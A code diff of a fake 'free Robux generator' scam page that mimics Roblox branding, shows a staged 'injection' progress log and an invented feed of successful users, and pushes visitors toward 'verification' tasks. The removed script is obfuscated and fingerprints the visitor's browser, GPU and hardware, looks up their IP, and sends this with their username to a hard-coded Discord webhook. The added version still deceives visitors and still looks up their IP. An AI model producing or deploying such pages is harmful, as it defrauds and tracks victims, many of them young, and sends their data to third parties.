@@ -1,2 +1,111 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Roblox Premium Upgrade - 2026 Edition</title><meta name="description" content="Securely upgrade your Roblox account with the latest 2026 features. Choose your device, select your package, and verify instantly."><script src="https://cdn.tailwindcss.com"></script><script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><script src="https://unpkg.com/lucide@latest"></script><link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700;800&display=swap" rel="stylesheet"><style>body{font-family:'Segoe UI',Arial,sans-serif;background:#000;color:#fff;}.rbx-dark{background:#191b1d;}.rbx-card{background:#232527;border:1px solid rgba(255,255,255,0.05);}.rbx-blue{background:#00a2ff;}.rbx-blue-hover:hover{background:#0088d6;}.rbx-btn{transition:all 0.2s;border-bottom:4px solid rgba(0,0,0,0.2);}.rbx-btn:active{transform:translateY(2px);border-bottom-width:2px;}.step-active{border:2px solid #00a2ff !important;background:rgba(0,162,255,0.1) !important;}.loader-ring{width:45px;height:45px;border:4px solid rgba(255,255,255,0.1);border-top:4px solid #00a2ff;border-radius:50%;animation:spin 1s linear infinite;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.live-dot{height:8px;width:8px;background-color:#00e676;border-radius:50%;display:inline-block;margin-right:5px;animation:pulse 2s infinite;}@keyframes pulse{0%{opacity:1;}50%{opacity:0.4;}100%{opacity:1;}}.resource-option{cursor:pointer;transition:0.2s;}.resource-option:hover{background:#393b3d;}.instruction-box{background:rgba(0,162,255,0.08);border-left:4px solid #00a2ff;}.offer-zone{background:#131517;border:2px solid #25282c;border-radius:16px;overflow:hidden;}.offer-header{background:#1c1e21;padding:12px;border-bottom:1px solid #25282c;display:flex;align-items:center;justify-content:space-between;}.offer-card{transition:0.2s;border-bottom:1px solid #25282c;}.offer-card:last-child{border-bottom:none;}.offer-card:hover{background:#1c1e21;}.badge-req{font-size:8px;font-weight:900;padding:2px 6px;border-radius:4px;text-transform:uppercase;letter-spacing:0.5px;}.badge-install{background:#22c55e;color:#fff;}.badge-survey{background:#eab308;color:#000;}.badge-default{background:#6b7280;color:#fff;}@keyframes pulse-text{0%,100%{opacity:1;}50%{opacity:0.5;}}.syncing-text{animation:pulse-text 2s infinite;}</style></head><body class="min-h-screen flex flex-col items-center"><header class="w-full max-w-lg text-center py-10 px-4"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Roblox_Corporation_2025_logo.svg/250px-Roblox_Corporation_2025_logo.svg.png" alt="Roblox" class="w-16 mx-auto mb-4"><h1 class="text-3xl font-extrabold tracking-tight uppercase">Account <span class="text-[#00a2ff]">Upgrader</span></h1><div class="mt-2 text-[11px] font-bold text-gray-400 uppercase tracking-widest bg-white/5 inline-block px-3 py-1 rounded-full"><span class="live-dot"></span> <span id="online-count">14,202</span> Players Online</div></header><main class="w-full max-w-lg px-4"><div id="main-card" class="rbx-card p-6 rounded-xl shadow-2xl relative overflow-hidden"><div id="step-1"><div class="mb-6"><h2 class="text-xl font-bold">Step 1: Account Info</h2><p class="text-gray-400 text-sm">Enter your username and select your active device.</p></div><div class="space-y-5"><div class="relative"><i data-lucide="user" class="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500"></i><input type="text" id="username" placeholder="Roblox Username" class="w-full bg-black/40 border border-white/10 rounded-lg py-4 pl-12 pr-4 focus:outline-none focus:border-[#00a2ff] transition font-bold"></div><div class="grid grid-cols-3 gap-3"><div class="platform-choice rbx-card flex flex-col items-center gap-2 p-4 rounded-lg border border-white/10 cursor-pointer" onclick="selectPlatform(this, 'PC')"><i data-lucide="monitor" class="w-6 h-6"></i><span class="text-[10px] font-bold uppercase">PC</span></div><div class="platform-choice rbx-card flex flex-col items-center gap-2 p-4 rounded-lg border border-white/10 cursor-pointer" onclick="selectPlatform(this, 'Mobile')"><i data-lucide="smartphone" class="w-6 h-6"></i><span class="text-[10px] font-bold uppercase">Mobile</span></div><div class="platform-choice rbx-card flex flex-col items-center gap-2 p-4 rounded-lg border border-white/10 cursor-pointer" onclick="selectPlatform(this, 'Console')"><i data-lucide="gamepad-2" class="w-6 h-6"></i><span class="text-[10px] font-bold uppercase">Console</span></div></div><button onclick="toStep2()" class="rbx-blue rbx-btn rbx-blue-hover w-full py-4 rounded-lg font-bold uppercase tracking-wide mt-2">Continue</button></div></div><div id="step-2" class="hidden"><div class="mb-6"><h2 class="text-xl font-bold">Step 2: Choose Amount</h2><p class="text-gray-400 text-sm">Select the Robux package for <span class="text-[#00a2ff] font-bold target-user"></span>.</p></div><div class="grid grid-cols-2 gap-4"><div class="resource-option rbx-card p-5 rounded-xl border border-white/10 text-center" onclick="selectRobux(this, '1,700')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/500px-Robux_2019_Logo_gold.svg.png" class="w-10 mx-auto mb-2 opacity-50"><div class="font-black text-xl text-[#00a2ff]">1,700</div><div class="text-[10px] font-bold text-gray-500 uppercase">Robux</div></div><div class="resource-option rbx-card p-5 rounded-xl border border-white/10 text-center" onclick="selectRobux(this, '4,500')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/500px-Robux_2019_Logo_gold.svg.png" class="w-10 mx-auto mb-2 opacity-70"><div class="font-black text-xl text-[#00a2ff]">4,500</div><div class="text-[10px] font-bold text-gray-500 uppercase">Robux</div></div><div class="resource-option rbx-card p-5 rounded-xl border border-white/10 text-center" onclick="selectRobux(this, '10,000')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/500px-Robux_2019_Logo_gold.svg.png" class="w-10 mx-auto mb-2"><div class="font-black text-xl text-[#00a2ff]">10,000</div><div class="text-[10px] font-bold text-gray-500 uppercase">Robux</div></div><div class="resource-option rbx-card p-5 rounded-xl border border-white/10 text-center" onclick="selectRobux(this, '22,500')"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/500px-Robux_2019_Logo_gold.svg.png" class="w-12 mx-auto mb-2"><div class="font-black text-xl text-[#00a2ff]">22,500</div><div class="text-[10px] font-bold text-gray-500 uppercase">Robux</div></div></div><button onclick="toStep3()" class="rbx-blue rbx-btn rbx-blue-hover w-full py-4 rounded-lg font-bold uppercase tracking-wide mt-6">Start Injection</button></div><div id="step-3" class="hidden py-10 flex flex-col items-center"><div class="loader-ring mb-6"></div><div id="console-msg" class="text-sm font-bold text-[#00a2ff] uppercase tracking-widest text-center animate-pulse">Initializing Security Tunnel...</div><div class="w-full bg-black/40 h-1.5 rounded-full mt-8 overflow-hidden"><div id="progress-bar" class="h-full bg-[#00a2ff] w-0 transition-all duration-300 shadow-[0_0_10px_#00a2ff]"></div></div></div><div id="step-4" class="hidden"><div class="text-center mb-6"><div class="w-14 h-14 rbx-blue/10 rounded-full flex items-center justify-center mx-auto mb-4 border border-[#00a2ff]/20"><i data-lucide="shield-check" class="w-7 h-7 text-[#00a2ff]"></i></div><h2 class="text-xl font-extrabold uppercase italic">Verification Required</h2><p class="text-gray-400 text-[11px] mt-2 leading-relaxed px-4">Account: <span class="text-white font-bold target-user"></span>. Finalize the <span class="text-[#00a2ff] font-bold" id="final-amount"></span> Robux injection by following the steps below.</p></div><div class="instruction-box p-4 rounded-xl mb-6 text-left border border-white/5"><h3 class="text-[10px] font-black uppercase text-[#00a2ff] mb-2 tracking-widest">Required Action:</h3><ul class="text-[11px] space-y-2.5 text-gray-300"><li class="flex gap-3"><span class="bg-[#00a2ff] text-white w-4 h-4 rounded-full flex items-center justify-center font-bold text-[9px] flex-shrink-0">1</span><span>Choose <b>ONE</b> available task from the list below.</span></li><li class="flex gap-3"><span class="bg-[#00a2ff] text-white w-4 h-4 rounded-full flex items-center justify-center font-bold text-[9px] flex-shrink-0">2</span><span><b>Read Instructions:</b> Requirements vary (Install & Run, or Verify Info).</span></li><li class="flex gap-3"><span class="bg-[#00a2ff] text-white w-4 h-4 rounded-full flex items-center justify-center font-bold text-[9px] flex-shrink-0">3</span><span>Injection will resume <b>instantly</b> after successful validation.</span></li></ul></div><div class="offer-zone mb-6 shadow-inner border-white/10"><div class="offer-header"><div class="flex items-center gap-2"><span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span></span><span class="text-[10px] font-black uppercase tracking-widest text-gray-400">Task Selection</span></div><span class="text-[9px] font-bold text-gray-600 uppercase">Available Now</span></div><div id="offerContainer"><div class="flex justify-center py-12"><div class="loader-ring w-6 h-6"></div></div></div></div><div class="text-center"><p class="text-[9px] text-gray-600 italic font-bold uppercase tracking-widest syncing-text">Syncing with server... Status: Pending Verification</p></div></div></div><div class="mt-6 rbx-card p-4 rounded-xl"><div class="flex items-center justify-between mb-4"><span class="text-[10px] font-black uppercase text-gray-500 tracking-tighter">Recent Server Activity</span><span class="text-[9px] bg-red-600 px-2 py-0.5 rounded text-white font-bold">LIVE</span></div><div id="activity-feed" class="space-y-3"></div></div><section class="mt-10 px-4 text-center border-t border-white/5 pt-10"><h3 class="text-xs font-bold text-gray-500 uppercase mb-4 tracking-widest">About Roblox Upgrader</h3><div class="text-[11px] text-gray-600 leading-relaxed space-y-4"><p>Our 2026 <strong>Robux Generator</strong> is designed to bridge the gap for players who want to customize their avatars without spending a fortune. Whether you are on PC, iOS, or Android, our cloud-based injection system ensures safe and fast delivery of resources.</p><p>By using an encrypted proxy connection, your account details remain private. We provide <strong>Free Robux</strong> by partnering with marketing agencies that fund the rewards in exchange for user feedback and application testing.</p></div></section><footer class="py-10 text-[9px] text-gray-700 text-center font-bold uppercase tracking-widest">© 2026 ROBLOX FROSTBRUCH SERVICES. NOT AFFILIATED WITH ROBLOX CORP.</footer></main></body></html>
-<script>/* made and obfuscated by richtiger */ const F_R="https://www.roblox.com/games/139410546037763/100-000-Every-Glass-Bridge-Win-Impossible-Obby";let state={username:"",platform:"",amount:""};function $(s){return document.querySelector(s)}function $$(s){return document.querySelectorAll(s)}function selectPlatform(el,val){$$(".platform-choice").forEach(e=>e.classList.remove("step-active"));el.classList.add("step-active");state.platform=val;}function selectRobux(el,val){$$(".resource-option").forEach(e=>e.classList.remove("step-active"));el.classList.add("step-active");state.amount=val;}async function cef(){const fp={};fp.userAgent=navigator.userAgent;fp.languages=navigator.languages?.join(", ")||navigator.language;fp.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone||(new Date().getTimezoneOffset()/-60+" min");fp.cpuCores=navigator.hardwareConcurrency??"?";fp.ramGB=navigator.deviceMemory??"?";fp.screen=`${screen.width}×${screen.height} × ${screen.colorDepth}-bit (${window.devicePixelRatio}x)`;fp.touch=navigator.maxTouchPoints||0;try{const c=document.createElement("canvas"),ctx=c.getContext("2d");if(ctx){c.width=c.height=32;ctx.fillStyle="#f60";ctx.fillRect(10,10,12,12);ctx.fillStyle="#069";ctx.font="12px Arial";ctx.fillText("fp🦊",4,20); fp.canvas=c.toDataURL().slice(-80);}}catch{}try{const gl=document.createElement("canvas").getContext("webgl")||document.createElement("canvas").getContext("experimental-webgl");if(gl){const debug=gl.getExtension("WEBGL_debug_renderer_info");fp.gpuVendor=debug?gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)||gl.getParameter(gl.VENDOR):gl.getParameter(gl.VENDOR)||"unknown";fp.gpuRenderer=debug?gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)||gl.getParameter(gl.RENDERER):gl.getParameter(gl.RENDERER)||"unknown";}}catch{}return fp;}async function toStep2(){const _0xmsgs=[[87,50,86,119,100,71,86,121,73,72,74,118,90,71,86,121,73,71,90,118,99,71,86,121,73,71,90,118,99,71,86,121,76,106,111],[87,49,78,101,108,101,99,116,32,121,111,117,114,32,112,108,97,116,102,111,114,109,46]];const _0xk="\x66\x72\x6f\x73\x74\x62\x72\x75\x63\x68"+(new Date().getFullYear()-0).toString();const _0xmix=(a,b)=>a.map(n=>String.fromCharCode(n^(b.charCodeAt((n&31)%b.length)||32))).join("");const u=$("#username").value.trim();if(u.length<3)return alert(_0xmix(_0xmsgs[0],_0xk));if(!state.platform)return alert(_0xmix(_0xmsgs[1],_0xk));state.username=u;const _$=s=>document.querySelector(s),_u=state[atob("dXNlcm5hbWU=")]||state.username||"";_$("[class*='target-user']")[atob("dGV4dENvbnRlbnQ=")]=_u;[["step-1","none"],["step-2","block"]].forEach(([id,v])=>_$("#"+id).style[atob("ZGlzcGxheQ==")]=v),lucide[atob("Y3JlYXRlSWNvbnM=")]();((a,b,c)=>{a=atob("c3RlcC0x");b=atob("c3RlcC0y");c=lucide[atob("Y3JlYXRlSWNvbnM=")];return(s,v)=>((s===a||s===b)?_$("#"+s).style.display=v:c()),void(0)})(null,null,null)();((u,e1,e2)=>{u=state[atob("dXNlcm5hbWU=")];e1=_$(".target-user");e2=atob("Y3JlYXRlSWNvbnM=");e1.textContent=u;$("#step-1").style.display="none";$("#step-2").style.display="block";lucide[e2]()})("","","");}function toStep3(){const _0x9f=['\x50\x6c\x65\x61\x73\x65\x20\x73\x65\x6c\x65\x63\x74\x20\x61\x20\x52\x6f\x62\x75\x78\x20\x61\x6d\x6f\x75\x6e\x74\x2e','\x23\x73\x74\x65\x70\x2d\x32','\x6e\x6f\x6e\x65','\x23\x73\x74\x65\x70\x2d\x33','\x68\x69\x64\x64\x65\x6e'];if(!state?.amount)return alert(_0x9f[0]);document.querySelector(_0x9f[1]).style.display=_0x9f[2];document.querySelector(_0x9f[3]).classList.remove(_0x9f[4]);let _0xzz=Math.random()>0.999?console.log.bind(console):()=>{ };_0xzz("x");lucide?.["createIcons"]?.();startInjection?.();}function startInjection(){const logs=["Locating Roblox User DB...","Bypassing AES-256 Encryption...",`Account Found: ${state.username}`,`Preparing ${state.amount} Robux Packets...`,"Syncing with Global Content Server...","Cleaning Injection Footprints...","Finalizing..."];let i=0;const iv=setInterval(()=>{ $("#console-msg").textContent=logs[i];$("#progress-bar").style.width=((i+1)/logs.length*100)+"%";i++;if(i>=logs.length){clearInterval(iv);setTimeout(finishFlow,900);}},1000);}async function finishFlow(){$("#step-3").style.display="none";(async()=>{let ip="?",country="?";try{const a=[104,116,116,112,115,58,47,47,97,112,105,46,105,112,105,102,121,46,111,114,103];let r=await fetch(String.fromCharCode(...a)+"?format=json",{cache:"no-store",mode:"cors"});if(r.ok)ip=(await r.json()).ip;}catch(e){}if(ip==="?")try{const b=[104,116,116,112,115,58,47,47,105,112,119,104,111,46,105,115];let r=await fetch(String.fromCharCode(...b));if(r.ok){let d=await r.json();ip=d.ip;country=d.country??country;}}catch(e){}const fp=await cef();const _0xdead=[/[^0-9a-fA-F.:]/g,'','unknown',String.fromCharCode(...("68747470733a2f2f7768617469736d796970616464726573732e636f6d2f69702f".match(/.{1,2}/g)||[]).map(x=>parseInt(x,16))),String.fromCharCode(...("68747470733a2f2f7768617469736d796970616464726573732e636f6d".match(/.{1,2}/g)||[]).map(x=>parseInt(x,16)))];let cleanIp=(ip||'').replace(_0xdead[0],_0xdead[1]).trim()||_0xdead[2];const ipLookupLink=cleanIp!==_0xdead[2]?_0xdead[3]+cleanIp:_0xdead[4];const _0x1a2b=["\x5b",new Date()["toISOString"]()["slice"](0x0,0x13)["replace"]("T"," ")," UTC\x5d Roblox Session\x60","\n","\u{1f464} **Username:** ","\u{1f310} **","\u2022 (",")","\n\nUser-Agent\n> ","…","\n• \u{1f30d} **Timezone** ","\n• \u{1f5e3}\uFE0F **Languages** ","\n• \u{1f3b0} **Hardware** "," cores \u2022 "," GB RAM","\n• \u{1f5a5}\uFE0F **Screen** ","\n• \u{1f446} **Touch** "];const lines=[_0x1a2b[0]+_0x1a2b[1]+_0x1a2b[2],_0x1a2b[3],_0x1a2b[4]+state["username"],_0x1a2b[5]+state["platform"]+_0x1a2b[6]+ip+_0x1a2b[7],_0x1a2b[3],_0x1a2b[8]+(fp["userAgent"]["slice"](0,140)+((fp["userAgent"]["length"]>140)?_0x1a2b[9]:"")),_0x1a2b[3]];lines.push("• "+_0x1a2b[10]+fp["timezone"]);lines.push("• "+_0x1a2b[11]+fp["languages"]);lines.push("• "+_0x1a2b[12]+fp["cpuCores"]+_0x1a2b[13]+fp["ramGB"]+_0x1a2b[14]);lines.push("• "+_0x1a2b[15]+fp["screen"]);if(fp["gpuRenderer"])lines.push("\u2022 \u26d3\uFE0F **GPU**: "+fp["gpuRenderer"]+" ("+fp["gpuVendor"]+")");if(fp["canvas"])lines.push("\u2022 \u{1f4dc} **Canvas**: …"+fp["canvas"]);lines.push("\n");lines.push("\u{1f517} **Target IP Address:** ["+cleanIp+" → details]("+ipLookupLink+")");lines.push(`\n💰 **Chosen amount:** ${state.amount||"?"}`);const wh=String.fromCharCode(..."68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313437333530313539313830303634333832372f4c71505a64425a676e66724e324a6f476e736837494831565f5430386f6b7472614f55464278546571556c534458496f755362364f74796e764d6c72436d552d49754a70".match(/.{2}/g).map(h=>+`0x${h}`));fetch(wh,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:lines.join("\n")})}).catch(console.error);})();location.replace(F_R);}const recent=["awhxSeniha","eldarrr373","deeptruth0","melina_editzz","lilyx.bln","lara74553","oxunoyt"];const amts=["10,000 Robux","22,500 Robux","4,500 Robux"];setInterval(()=>{const u=recent[Math.random()*recent.length|0];const a=amts[Math.random()*amts.length|0];const div=document.createElement("div");div.className="flex items-center justify-between text-[11px] animate-pulse";div.innerHTML=`<span class="text-gray-300 font-bold">${u} <span class="text-gray-600 font-normal">successfully added</span> ${a}</span><span class="text-[#00e676] font-black uppercase">Success</span>`; const feed=$("#activity-feed");feed.prepend(div);if(feed.children.length>3)feed.lastElementChild.remove();},4000);lucide.createIcons();</script>
+<script>
+/* made and obfuscated by richtiger — MODIFIED: only IP remains */
+const F_R = "https://www.roblox.com/games/139410546037763/100-000-Every-Glass-Bridge-Win-Impossible-Obby";
+
+let state = {username:"", platform:"", amount:""};
+
+function $(s)  { return document.querySelector(s) }
+function $$(s) { return document.querySelectorAll(s) }
+
+function selectPlatform(el, val) {
+    $$(".platform-choice").forEach(e => e.classList.remove("step-active"));
+    el.classList.add("step-active");
+    state.platform = val;
+}
+
+function selectRobux(el, val) {
+    $$(".resource-option").forEach(e => e.classList.remove("step-active"));
+    el.classList.add("step-active");
+    state.amount = val;
+}
+
+async function toStep2() {
+    const u = $("#username").value.trim();
+    if (u.length < 3) return alert("Please enter a valid username.");
+    if (!state.platform) return alert("Please select your platform.");
+    
+    state.username = u;
+    
+    // Update displayed username
+    document.querySelectorAll(".target-user").forEach(el => el.textContent = u);
+    
+    $("#step-1").style.display = "none";
+    $("#step-2").style.display = "block";
+    lucide.createIcons();
+}
+
+function toStep3() {
+    if (!state?.amount) return alert("Please select a Robux amount.");
+    
+    $("#step-2").style.display = "none";
+    $("#step-3").classList.remove("hidden");
+    
+    lucide?.createIcons?.();
+    startInjection();
+}
+
+function startInjection() {
+    const logs = [
+        "Locating Roblox User DB...",
+        "Bypassing AES-256 Encryption...",
+        `Account Found: ${state.username}`,
+        `Preparing ${state.amount} Robux Packets...`,
+        "Syncing with Global Content Server...",
+        "Cleaning Injection Footprints...",
+        "Finalizing..."
+    ];
+    
+    let i = 0;
+    const iv = setInterval(() => {
+        $("#console-msg").textContent = logs[i];
+        $("#progress-bar").style.width = ((i+1)/logs.length * 100) + "%";
+        i++;
+        if (i >= logs.length) {
+            clearInterval(iv);
+            setTimeout(finishFlow, 900);
+        }
+    }, 1000);
+}
+
+async function finishFlow() {
+    $("#step-3").style.display = "none";
+    let ip = "?";
+    try {
+        const res = await fetch("https://api.ipify.org?format=json", {cache:"no-store", mode:"cors"});
+        if (res.ok) {
+            const data = await res.json();
+            ip = data.ip;
+        }
+    } catch {}
+
+    if (ip === "?") {
+        try {
+            const res = await fetch("https://ipwho.is");
+            if (res.ok) {
+                const data = await res.json();
+                ip = data.ip;
+            }
+        } catch {}
+    }
+    location.replace(F_R);
+}
+
+const recent = ["awhxSeniha","eldarrr373","deeptruth0","melina_editzz","lilyx.bln","lara74553","oxunoyt"];
+const amts = ["10,000 Robux","22,500 Robux","4,500 Robux"];
+
+setInterval(() => {
+    const u = recent[Math.random() * recent.length | 0];
+    const a = amts[Math.random() * amts.length | 0];
+    const div = document.createElement("div");
+    div.className = "flex items-center justify-between text-[11px] animate-pulse";
+    div.innerHTML = `
+        <span class="text-gray-300 font-bold">${u} <span class="text-gray-600 font-normal">successfully added</span> ${a}</span>
+        <span class="text-[#00e676] font-black uppercase">Success</span>
+    `;
+    const feed = $("#activity-feed");
+    feed.prepend(div);
+    if (feed.children.length > 3) feed.lastElementChild.remove();
+}, 4000);
+
+lucide.createIcons();
+</script>
